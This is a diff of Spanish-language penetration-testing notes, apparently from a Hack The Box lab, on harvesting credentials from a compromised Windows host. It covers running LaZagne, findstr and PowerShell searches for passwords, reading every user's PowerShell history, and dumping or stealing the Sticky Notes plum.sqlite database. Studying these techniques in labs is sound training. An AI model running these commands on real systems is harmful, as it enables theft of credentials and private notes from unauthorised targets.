@@ -24,22 +24,47 @@ Una vez que lo metimos en la pc victima lo corremos con:
 
     start lazagne.exe all
 
-también podemos usar el findr por cmd:
+#### también podemos usar el findr por cmd:
 
     findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
-También traer contraseñas de chrome:
+#### También traer contraseñas de chrome:
 
     gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
 
-Powershell History
+#### Powershell History
 
     gc (Get-PSReadLineOption).HistorySavePath
 
-Podemos también en un oneliner recorrer todos los archivos historicos de powershell a los que tenemos acceso
+#### Podemos también en un oneliner recorrer todos los archivos historicos de powershell a los que tenemos acceso
 
     foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
 
-El archivo unnatend.xml puede tener contraseñas también
+#### El archivo unnatend.xml puede tener contraseñas también
 
+#### Buscar archivos en base a una palabra:
 
+    findstr /spin "password" *.* 
+
+#### Buscar con powershell
+    select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+
+#### BUscar una palabra en base a una extensión:
+    dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+
+#### Extraer contraseñas de sticky notes
+Las sticky notes (aunque no lo demuesten) son una base de datos.
+
+Esta base de datos se encuentra en:
+
+C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+
+Podemos acceder a ella y luego robarla para cargarla en nuestra pc atacante o dumpearla con powershell mediante PSSQLite.
+##### Powershell local
+- Import-Module .\PSSQLite.psd1
+- $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+- Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
+
+##### Linux:
+- Robamos el archivo plum.sqlite-wal
+- Corremos con strings
